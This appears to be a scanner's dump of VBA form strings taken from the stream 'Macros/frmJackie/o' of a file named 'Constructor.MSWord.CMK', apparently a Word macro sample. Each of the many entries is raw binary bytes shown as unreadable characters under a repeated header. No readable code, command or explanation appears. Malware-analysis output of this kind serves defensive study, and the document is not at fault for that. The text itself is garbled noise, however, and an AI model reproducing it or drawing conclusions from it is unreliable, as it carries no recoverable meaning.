- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�vW��+�<���1�4P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;�Bv���?�!I}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�տ�.��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!;_���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ѿ�G��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H�v�Eu8e �VuH�-Nq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@V��~DUJ��夷������]��-7�!/��[���@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Jͭ+O�B�PuW�O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_���iGyz��%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'���սo�C���|��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������k����d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^��J4g��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)`Ю�y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�a�ڤ���z���K��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZM���{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����_�P]_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��>��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4_i��6�0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����>sy�@X�b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���>Ǌ�<�[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I�~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#e�z�#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��4��y�^d�Q�;Fr��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F=�����\�c���A"���r��!P�~�
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}�ė��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|�ֻ+K���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3س�?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�J��	+=���H'�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�|��wO�4�����h䨢���,(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N���'��)����?�to�Ri�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
����s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��}��_d�u���6�q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^�U�D��i�:��?S#��E7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|ֺ�]��*=�Dc�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�Ee
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1�lI�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'�ݚ����Xa��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@�@�8���o�r���$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ЍR_�*��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
·�G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(�����(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b���oh����$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��^��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����O�9� 
�~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ن���#�Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]N�RM)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ׅ���*1�6z�jia���ќ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

[�[���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$u8�A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E�["�.X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'��u���;��U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B�ʯ�Y$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_2@Po`��*@#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�lzV���h��0��E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a������q�T�1����6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(��*)o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\�_D�[M�S�X�Rk�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&���u;&���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�~u�i�*��[L�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
iNi�<�������&����!C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T5�&��<v��(� ��(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ΙΫi�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ѿ�I��^������*+��������>�ȯ�D*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]�C�PD��;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p@2�\��2{�{8����'�%�� 9�	�)���$#�_�y|n��ݨ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-���`��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���臼�O��cs���t��L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��<u���'[�'�{7�#�]ֆ5��y	��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R��*�
(��
(��;�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G�xn�n�Js�/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^�"2\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ꆇ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��l$���O����vֆ�!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b�-����*�vǽ|�}g9��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��RZF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���a����lXJXE+�x���lV��ޥ��g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y��QČT�װ�j�ݠK��	B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!�cyml�ݦ��	H� )8a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e8��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]J�,2��4���ɆvS�lPA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����-�EV-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@��0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C��Ԟ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��2Y��Y̍*yҰ��5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��)<{�5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E�t��1|sj�x�ʣ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5�m`�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8$��v>;�̵���ά�H};��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\�#~�}ǟ�_�o��E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Zҹ����7O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T7?��/�����O��,���?�!PO�ć����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t�"[���E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*�7�1�O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x��og�y?�&\���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?�:�Du�	i�U�:�m.��]�)2y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��=���U5ubS��b���]�%��r�::����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'��5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ұ�1���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ӫ'��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{
M|cW����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z�I�t���m{�_��u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Kkn�WQ[ƥ�F

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����5�5�ڤ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z/�q�G��3�V5��*nf�i�J�']t�cd��	"�%���ܰ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c=��k3QԛIӢ�fU�I�S�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ����\�85/�'�P�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�J�#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x�H��N3\w�5���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G��@J�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}[��X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����RQ��=
��NQ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�'�k���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c�zU�V��b�&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:B�6���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�˨�T���ӬV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W��2s׹�G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E��F]Y]�"�����-{u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|�޹ld�R7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ڪ�輱�R%�S(3�$eՀuϺ��t�&F_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`�H�P�N@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p��p3�X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!�����mp�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+t��C[R�zR�
-------------------------------------------------------------------------------
